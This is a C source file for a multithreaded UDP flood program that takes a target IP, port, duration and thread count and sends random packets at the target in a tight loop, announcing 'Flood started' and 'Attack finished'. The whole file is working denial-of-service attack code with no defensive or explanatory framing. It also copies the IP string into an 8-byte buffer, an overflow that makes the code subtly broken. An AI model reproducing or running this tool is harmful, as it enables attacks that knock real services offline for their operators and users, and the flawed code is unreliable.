#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

void usage() {
    printf("Usage: ./program ip port time threads\n");
    exit(1);
}

struct thread_data {
    char ip[8];  // Store IP properly
    int port;
    int time;
};

// Function to generate random payload
void generate_random_payload(unsigned char *payload, size_t size) {
    for (size_t i = 0; i < size; i++) {
        payload[i] = rand() % 256; // Generate a random byte (0x00 to 0xFF)
    }
}

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    endtime = time(NULL) + data->time;

    // Generate a random payload
    unsigned char payload[8]; // Adjust size as needed
    generate_random_payload(payload, sizeof(payload));

    while (time(NULL) <= endtime) {
        // Send random payload
        if (sendto(sock, payload, sizeof(payload), 0,
                   (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            perror("Send failed");
            close(sock);
            pthread_exit(NULL);
        }
    }

    close(sock);
    free(data);  // Free allocated memory
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int attack_duration = atoi(argv[3]); // Renamed variable
    int threads = atoi(argv[4]);

    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));

    printf("Flood started on %s:%d for %d seconds with %d threads\n", ip, port, attack_duration, threads);

    // Seed the random number generator
    srand(time(NULL));

    for (int i = 0; i < threads; i++) {
        struct thread_data *data = malloc(sizeof(struct thread_data));  // Allocate separate memory
        strcpy(data->ip, ip);
        data->port = port;
        data->time = attack_duration;

        if (pthread_create(&thread_ids[i], NULL, attack, (void *)data) != 0) {
            perror("Thread creation failed");
            free(thread_ids);
            exit(1);
        }
        // Commented out the following line to suppress thread ID output
        // printf("Launched thread with ID: %lu\n", thread_ids[i]);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);
    printf("Attack finished\n");
    return 0;
}